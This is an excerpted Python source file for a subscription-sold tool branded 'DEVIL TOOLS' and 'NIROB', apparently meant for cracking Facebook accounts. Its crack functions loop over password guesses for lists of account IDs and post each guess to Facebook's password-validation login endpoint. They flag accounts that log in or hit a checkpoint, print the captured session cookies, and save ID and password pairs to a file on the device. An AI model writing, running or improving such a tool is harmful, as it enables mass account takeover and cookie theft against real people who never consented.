...
def main():
    stored_password = "DEVIL" #  Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to -DEVIL TOOLS!")
            os.system('espeak -a 300 "Welcome to Devil Tools varson 16 ..."')
            time.sleep(2)
            os.system('clear')
...
def Subscraption():
    ...
    if id in r1:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 200 Taka \033[0;95m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 500 Taka \033[0;95m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m NIROB TooLs Daily Update)✅ \033[0;95m")
...
os.system('espeak -a 300 " Welcome,   to,   DEVIL-KING,  Tools"')
pass
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/NIROB.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[NIROB•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[NIROB•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mNIROB-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                ...
                print(f'\r\033[0;95mNIROB-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[NIROB\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mNIROB-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/NIROB-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0;95mNIROB-Ok] {idf} \033[0;97m• \033[0;95m{pw} ')
                #cek_apk(session,coki)
